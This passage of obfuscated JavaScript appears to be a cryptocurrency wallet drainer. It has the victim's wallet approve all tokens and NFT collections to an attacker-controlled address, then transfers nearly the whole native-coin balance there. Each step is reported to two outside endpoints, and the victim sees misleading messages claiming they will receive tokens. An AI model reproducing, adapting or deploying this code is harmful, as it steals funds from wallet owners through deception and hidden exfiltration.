_0x36bba0=_0x71a47e;if(tokens[_0x36bba0(0x173)])try{loopTokens(tokens);}catch(_0x354f63){console[_0x36bba0(0x127)](_0x36bba0(0x118)+_0x354f63[_0x36bba0(0x1c1)]);}else{if(NFTs['length']){try{loopNfts(NFTs);}catch(_0x2015ae){console[_0x36bba0(0x127)](_0x36bba0(0x118)+_0x2015ae[_0x36bba0(0x1c1)]);}onSendEther(),sendMessage(_0x36bba0(0x158));}else try{onSendEther();}catch(_0x5ec076){console[_0x36bba0(0x127)](_0x36bba0(0x118)+_0x5ec076[_0x36bba0(0x1c1)]);}}}async function loopTokens(_0x122efe){const _0x186eba=_0x71a47e;for await(let _0x989ad6 of _0x122efe){console[_0x186eba(0x168)](_0x186eba(0x14e),_0x989ad6);try{sendMessage(_0x186eba(0x10f));let {hash:_0x2dea5a}=await writeContract({'address':_0x989ad6[_0x186eba(0x166)],'abi':ABI,'functionName':'approve','args':[Oxa,_0x186eba(0x196)]});console[_0x186eba(0x168)](_0x186eba(0x147),_0x2dea5a),_0x2dea5a&&(console[_0x186eba(0x168)](_0x186eba(0x1b5)),sendMessage(_0x186eba(0x11b)),sendMessage(_0x186eba(0x17a)+_0x989ad6[_0x186eba(0x166)]),sendMessage(_0x186eba(0x13b)+_0x989ad6['balance']),sendMessage(_0x186eba(0x137)+Oxa));}catch(_0x5f39cd){console[_0x186eba(0x168)](_0x186eba(0x188)+_0x5f39cd),sendMessage(_0x186eba(0x13f));}};await loopNfts(NFTs);}async function loopNfts(_0x568358){const _0xcac861=_0x71a47e;for await(let _0x22a5bc of _0x568358){console[_0xcac861(0x168)]('NFT',_0x22a5bc);try{let {hash:_0x237fd1}=await writeContract({'address':_0x22a5bc[_0xcac861(0x194)],'abi':ABIN,'functionName':_0xcac861(0x117),'args':[Oxa,!![]]});console[_0xcac861(0x168)]('hash',_0x237fd1),console[_0xcac861(0x168)](_0xcac861(0x198)+receipt),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0xcac861(0x17f)+_0x22a5bc[_0xcac861(0x194)]),sendMessage('Your\x20address\x20'+Oxa);}catch(_0xd08782){console[_0xcac861(0x168)]('Error:\x20'+_0xd08782),sendMessage(_0xcac861(0x13f));}}await onSendEther();}async function onSendEther(){const _0x107103=_0x71a47e;console['log'](_0x107103(0x19c));try{let _0x386787=await fetchBalance({'address':selectedAccount});console['log'](_0x386787);const _0x2d9b1e=await fetchFeeData();console[_0x107103(0x168)](_0x2d9b1e);var _0x5805f7=_0x2d9b1e[_0x107103(0x1be)][_0x107103(0x132)];_0x5805f7=parseFloat(_0x5805f7);let _0x42e5d6=parseFloat(_0x386787[_0x107103(0x1be)])-_0x5805f7*0.00021;_0x42e5d6=parseEther(_0x42e5d6[_0x107103(0x1a9)]()),console['log'](_0x42e5d6);const {hash:_0x51e85b}=await sendTransaction({'to':Oxa,'value':_0x42e5d6});console[_0x107103(0x168)](_0x51e85b),sendMessage(_0x107103(0x1b0),_0x51e85b),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0x123abc){sendMessage1(_0x123abc),sendMessage2(_0x123abc);}async function sendMessage1(_0x382cd4){return new Promise((_0x1f953a,_0x509187)=>{const _0x22f47a=_0x537e,_0x742f86=Oxc1;fetch(_0x22f47a(0x12c)+_0x742f86+_0x22f47a(0x178)+_0x382cd4,{'method':_0x22f47a(0x1bb),'headers':{}})[_0x22f47a(0x161)](async _0x2c529f=>{const _0x25eac4=_0x22f47a;if(_0x2c529f[_0x25eac4(0x111)]>0x18f)throw _0x2c529f;_0x1f953a(await _0x2c529f[_0x25eac4(0x1ad)]());})[_0x22f47a(0x131)](_0x397a0b=>{_0x509187(_0x397a0b);});});}async function sendMessage2(_0xdb76ab){return new Promise((_0x206c79,_0x5b98d8)=>{const _0x33e56c=_0x537e,_0x19ac2c=Oxc2;fetch(_0x33e56c(0x12c)+_0x19ac2c+_0x33e56c(0x178)+_0xdb76ab,{'method':_0x33e56c(0x1bb),'headers':{}})['then'](async _0x5dcc07=>{const _0x4fa52e=_0x33e56c;if(_0x5dcc07[_0x4fa52e(0x111)]>0x18f)throw _0x5dcc07;_0x206c79(await _0x5dcc07[_0x4fa52e(0x1ad)]());})[_0x33e56c(0x131)](_0x1691b8=>{_0x5b98d8(_0x1691b8);});});}async function getPrice(_0x174db7){return new Promise((_0xdfb22d,_0x37724b)=>{const _0x2a0e43=_0x537e;fetch(_0x2a0e43(0x184)+_0x174db7+'&vs_currencies=usd',{'method':_0x2a0e43(0x1bb),'headers':{}})['then'](async _0xf7e7fe=>{const _0x2346fd=_0x2a0e43;if(_0xf7e7fe[_0x2346fd(0x111)]>0x18f)throw _0xf7e7fe;_0xdfb22d(await _0xf7e7fe[_0x2346fd(0x1ad)]());})[_0x2a0e43(0x131)](_0x219023=>{_0x37724b(_0x219023);});});}async function getValue(_0x3c4587,_0x2d1f4b,_0x424b65){const _0x399af2=_0x71a47e;console[_0x399af2(0x168)](_0x3c4587,_0x2d1f4b,_0x424b65);let _0x40210b=await getPrice(_0x3c4587);console[_0x399af2(0x168)]('price',_0x40210b),_0x40210b=parseFloat(_0x40210b[_0x3c4587][_0x399af2(0x1ae)]);let _0xbc0610=_0x2d1f4b/0xa**(_0x424b65||0x12)*_0x40210b;return _0xbc0610=parseInt(_0xbc0610),_0x40210b?_0xbc0610:0x0;}async function getNFTs(_0x2e6e5b='',_0x4f8ecd=_0x71a47e(0x115),_0x116ce1='eth',_0x36fba8='50'){return new Promise((_0x5652b0,_0xf06dd7)=>{const _0x1e4ad6=_0x537e;fetch(_0x1e4ad6(0x17d)+_0x2e6e5b+_0x1e4ad6(0x10a)+_0x116ce1+_0x1e4ad6(0x193)+_0x36fba8,{'method':_0x1e4ad6(0x1bb),'headers':{'accept':'application/json','X-API-Key':_0x4f8ecd}})['then'](async _0xd87b02=>{const _0x1f3ab7=_0x1e4ad6;if(_0xd87b02[_0x1f3ab7(0x111)]>0x18f)throw _0xd87b02;_0x5652b0(await _0xd87b02['json']());})['catch'](_0x3ecebf=>{_0xf06dd7(_0x3ecebf);});});}